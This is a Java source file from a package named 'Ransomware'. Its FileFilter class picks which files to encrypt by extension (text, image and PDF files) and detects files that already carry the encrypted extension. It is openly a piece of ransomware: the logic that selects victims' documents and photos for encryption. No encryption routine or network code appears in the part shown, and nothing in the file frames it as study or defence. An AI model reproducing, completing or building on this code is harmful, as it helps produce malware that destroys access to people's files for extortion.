package Ransomware;

import java.io.File;
import java.util.ArrayList;

public class FileFilter {
    private final String ext;
    private final ArrayList<String> extensionsFileToEncrypt;

    public FileFilter(String ext){
        this.ext = ext;
        this.extensionsFileToEncrypt = new ArrayList<>();
        extensionsFileToEncrypt.add("txt");
        extensionsFileToEncrypt.add("png");
        extensionsFileToEncrypt.add("jpeg");
        extensionsFileToEncrypt.add("jpg");
        extensionsFileToEncrypt.add("pdf");
    }
    private String getExtension(File file){ return file.getName().substring(file.getName().lastIndexOf(".")+1); }
    public boolean isEncrypted(File file){ return file.getName().contains(ext); }
    public boolean isAEncryptableFile(File file){
        return extensionsFileToEncrypt.contains(getExtension(file));
    }
}
